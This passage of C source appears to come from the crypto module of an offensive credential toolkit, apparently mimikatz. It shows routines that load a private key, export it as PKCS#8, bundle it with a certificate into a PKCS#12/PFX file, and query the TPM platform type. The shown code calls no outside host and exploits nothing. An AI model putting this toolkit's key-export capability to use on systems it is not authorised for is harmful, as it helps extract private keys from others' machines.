					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
					LocalFree(aData);
				}
				else PRINT_ERROR_AUTO(L"kull_m_string_EncodeB64_headers");
			}
			else PRINT_ERROR(L"NCryptExportKey(data): 0x%08x\n", nStatus);
			LocalFree(bKey8);
		}
	}
	else PRINT_ERROR(L"NCryptExportKey(init): 0x%08x\n", nStatus);
	return status;
}

NTSTATUS kuhl_m_crypto_keyutil(int argc, wchar_t * argv[])
{
	NCRYPT_PROV_HANDLE hProv;
	CERT_KEY_CONTEXT ctx = {sizeof(CERT_KEY_CONTEXT), 0, CERT_NCRYPT_KEY_SPEC};
	HCERTSTORE hCertStore;
	PCCERT_CONTEXT pCertContext;
	LPCWSTR szFile;
	PBYTE pbKey, pbCert;
	DWORD cbKey, cbCert;

	if(kull_m_string_args_byName(argc, argv, L"key", &szFile, NULL) || kull_m_string_args_byName(argc, argv, L"in", &szFile, NULL))
	{
		kprintf(L"Private key\n===========\n");
		if(kull_m_file_readData(szFile, &pbKey, &cbKey))
		{
			if(kuhl_m_crypto_NCrypt_AutoKey(pbKey, cbKey, &hProv, &ctx.hNCryptKey))
			{
				kuhl_m_crypto_printKeyInfos(ctx.hNCryptKey, 0, 0);
				kprintf(L"\n");
				if(kull_m_string_args_byName(argc, argv, L"p8", &szFile, NULL) || kull_m_string_args_byName(argc, argv, L"pkcs8", &szFile, NULL) || kull_m_string_args_byName(argc, argv, L"pk8", &szFile, NULL))
				{
					kprintf(L"PKCS#8 export\n=============\n    Export: ");
					if(kuhl_m_crypto_keyutil_export_pkcs8_file(ctx.hNCryptKey, szFile))
						kprintf(L"OK - %s\n", szFile);
				}
				if(kull_m_string_args_byName(argc, argv, L"cert", &szFile, NULL))
				{
					kprintf(L"Certificate\n===========\n");
					if(kull_m_file_readData(szFile, &pbCert, &cbCert))
					{
						if(kuhl_m_crypto_ImportCert(pbCert, cbCert, &hCertStore, &pCertContext))
						{
							kuhl_m_crypto_certificate_descr(pCertContext);
							kprintf(L"\n");
							if(kull_m_string_args_byName(argc, argv, L"p12", &szFile, NULL) || kull_m_string_args_byName(argc, argv, L"pfx", &szFile, NULL) || kull_m_string_args_byName(argc, argv, L"pkcs12", &szFile, NULL) || kull_m_string_args_byName(argc, argv, L"out", &szFile, NULL))
							{
								kprintf(L"PKCS#12 export\n==============\n    Export: ");
								if(CertSetCertificateContextProperty(pCertContext, CERT_KEY_CONTEXT_PROP_ID, CERT_STORE_NO_CRYPT_RELEASE_FLAG , &ctx))
								{
									if(kull_m_crypto_exportPfx(hCertStore, szFile))
										kprintf(L"OK - %s\n", szFile);
								}
								else PRINT_ERROR_AUTO(L"CertSetCertificateContextProperty");
							}
							kuhl_m_crypto_FreeHandleCert(&hCertStore, &pCertContext);
						}
						LocalFree(pbCert);
					}
					else PRINT_ERROR_AUTO(L"kull_m_file_readData(cert)");
				}
				kull_m_crypto_NCryptFreeHandle(&hProv, &ctx.hNCryptKey);
			}
			LocalFree(pbKey);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData(key)");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_platforminfo(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	NCRYPT_PROV_HANDLE hProvider;
	DWORD cbPlatformType;
	LPWSTR PlatformType;

	__try
	{
		status = NCryptOpenStorageProvider(&hProvider, MS_PLATFORM_CRYPTO_PROVIDER, 0);
		if(status == ERROR_SUCCESS)
		{
			status = NCryptGetProperty(hProvider, NCRYPT_PCP_PLATFORM_TYPE_PROPERTY, NULL, 0, &cbPlatformType, 0);
			if(status == ERROR_SUCCESS)
			{
				if(PlatformType = (LPWSTR) LocalAlloc(LPTR, cbPlatformType))
				{
					status = NCryptGetProperty(hProvider, NCRYPT_PCP_PLATFORM_TYPE_PROPERTY, (PBYTE) PlatformType, cbPlatformType, &cbPlatformType, 0);
					if(status == ERROR_SUCCESS)
						kprintf(L"%.*s\n", cbPlatformType / sizeof(wchar_t), PlatformType);
					else PRINT_ERROR(L"NCryptGetProperty(data): 0x%08x\n", status);
					LocalFree(PlatformType);
				}
			}
			else PRINT_ERROR(L"NCryptGetProperty(init): 0x%08x\n", status);
			NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG?\n");
	}
	return STATUS_SUCCESS;
}